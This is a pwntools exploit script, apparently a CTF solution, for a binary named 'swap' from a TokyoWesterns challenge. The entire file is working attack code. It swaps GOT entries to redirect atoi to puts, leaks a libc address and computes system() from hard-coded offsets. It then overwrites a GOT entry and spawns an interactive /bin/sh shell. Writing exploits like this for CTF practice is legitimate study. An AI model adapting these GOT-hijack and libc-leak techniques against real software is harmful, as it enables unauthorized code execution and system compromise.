from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
#io = remote('127.1', 4444)
#io = remote('pwn1.chal.ctf.westerns.tokyo', 19937)
io = process('./swap')

offset___libc_start_main_ret = 0x20830
offset_system = 0x0000000000045390
offset_dup2 = 0x00000000000f7940
offset_read = 0x00000000000f7220
offset_write = 0x00000000000f7280
offset_str_bin_sh = 0x18cd17

puts_got   = 0x601018
puts_plt   = 0x4006b0
atoi_got   = 0x601050
memcpy_got = 0x601040
read_got   = 0x601028
atoll_got  = 0x601038

def set_addr1(addr):
    io.sendlineafter('addr\n', str(addr))
def set_addr2(addr):
    io.sendlineafter('addr\n', str(addr))
def do_swap():
    io.sendlineafter('choice: \n', '2')
def do_set():
    io.sendlineafter('choice: \n', '1')

do_set()
set_addr1(memcpy_got)
set_addr2(read_got)
do_swap()

do_set()
set_addr1(0)
set_addr2(atoi_got)
do_swap() # read

io.send(p64(puts_plt))
io.recvuntil('choice: \n')
#raw_input('#')
io.send('A') # leak libc
libc = u64(io.recv(1024)[:6].ljust(8, '\x00')) - 0x3c5641
system = libc + offset_system
log.info("Libc:   0x{:x}".format(libc))

io.send('2\x00') # let puts return 2 to do swap
io.recv(1024)
io.send(p64(system))
io.recv(1024)
io.send('/bin/sh\x00')
io.interactive()

